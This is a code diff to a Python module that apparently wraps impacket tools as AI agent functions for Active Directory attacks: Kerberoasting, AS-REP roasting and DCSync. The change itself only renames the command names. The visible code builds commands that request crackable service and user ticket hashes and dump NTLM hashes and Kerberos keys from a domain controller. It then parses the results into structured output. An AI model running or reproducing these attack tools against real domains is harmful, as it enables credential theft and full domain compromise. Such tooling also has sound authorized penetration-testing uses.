@@ -124,7 +124,7 @@ def kerberoast(
     password: str = "",
 ) -> str:
     """
-    Perform Kerberoasting attack using impacket-GetUserSPNs to request
+    Perform Kerberoasting attack using GetUserSPNs.py to request
     TGS tickets for service accounts. The extracted tickets contain hashes
     that can be cracked offline to recover service account passwords.
 
@@ -155,7 +155,7 @@ def kerberoast(
         else f"{shlex.quote(domain)}/"
     )
     cmd_parts = [
-        "impacket-GetUserSPNs",
+        "GetUserSPNs.py",
         cred,
         f"-dc-ip {shlex.quote(domain_controller)}",
         "-request",
@@ -177,7 +177,7 @@ def kerberoast(
                 current_ticket["spn"] = line.strip()
 
     result = {
-        "tool": "impacket-GetUserSPNs",
+        "tool": "GetUserSPNs.py",
         "domain_controller": domain_controller,
         "domain": domain,
         "tickets": tickets,
@@ -192,7 +192,7 @@ def kerberoast(
 @function_tool(strict_mode=False)
 def asreproast(domain_controller: str, domain: str) -> str:
     """
-    Perform AS-REP Roasting attack using impacket-GetNPUsers to find
+    Perform AS-REP Roasting attack using GetNPUsers.py to find
     accounts that do not require Kerberos pre-authentication. These
     accounts can have their AS-REP encrypted data requested and cracked
     offline without any credentials.
@@ -212,7 +212,7 @@ def asreproast(domain_controller: str, domain: str) -> str:
         asreproast(domain_controller="dc01.corp.local", domain="corp.local")
     """
     cmd = (
-        f"impacket-GetNPUsers {shlex.quote(domain)}/ "
+        f"GetNPUsers.py {shlex.quote(domain)}/ "
         f"-dc-ip {shlex.quote(domain_controller)} "
         f"-no-pass -usersfile /tmp/ad_users.txt "
         f"-format hashcat -outputfile /tmp/asrep_hashes.txt"
@@ -239,7 +239,7 @@ def asreproast(domain_controller: str, domain: str) -> str:
                 vulnerable_accounts.append(parts[0])
 
     result = {
-        "tool": "impacket-GetNPUsers",
+        "tool": "GetNPUsers.py",
         "domain_controller": domain_controller,
         "domain": domain,
         "vulnerable_accounts": vulnerable_accounts,
@@ -385,7 +385,7 @@ def dcsync_attack(
     password: str,
 ) -> str:
     """
-    Perform DCSync attack using impacket-secretsdump to replicate
+    Perform DCSync attack using secretsdump.py to replicate
     domain credentials via the MS-DRSR protocol. Extracts NTLM hashes,
     Kerberos keys, and cached credentials from the domain controller.
 
@@ -411,7 +411,7 @@ def dcsync_attack(
         )
     """
     cmd = (
-        f"impacket-secretsdump "
+        f"secretsdump.py "
         f"{shlex.quote(f'{domain}/{username}:{password}')}@{shlex.quote(domain_controller)} "
         f"-outputfile /tmp/dcsync_dump"
     )
@@ -442,7 +442,7 @@ def dcsync_attack(
             kerberos_keys.append(line)
 
     result = {
-        "tool": "impacket-secretsdump",
+        "tool": "secretsdump.py",
         "domain_controller": domain_controller,
         "domain": domain,
         "ntlm_hashes": ntlm_hashes,
